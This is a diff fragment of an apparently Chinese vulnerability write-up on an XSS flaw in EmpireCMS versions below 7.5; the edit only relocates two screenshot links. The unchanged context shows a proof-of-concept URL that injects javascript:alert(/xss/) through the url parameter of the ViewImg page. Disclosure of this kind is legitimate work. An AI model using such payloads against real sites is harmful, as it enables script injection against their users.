@@ -15,4 +15,4 @@ EmpireCMS 全版本 <7.5
 http://*******/e/ViewImg/index.html?url=javascript:alert(/xss/)
 ```
 
-![](https://www.bylibrary.cn/wp-content/uploads/2020/09/K52GS8VKPFJ7RHL7J1.png) ![](https://www.bylibrary.cn/wp-content/uploads/2020/09/PWG@XY7ATDZ@YR.png)
+![](EmpireCMS%20%E5%85%A8%E7%89%88%E6%9C%ACXSS%E6%BC%8F%E6%B4%9E/K52GS8VKPFJ7RHL7J1.png) ![](EmpireCMS%20%E5%85%A8%E7%89%88%E6%9C%ACXSS%E6%BC%8F%E6%B4%9E/PWG@XY7ATDZ@YR.png)
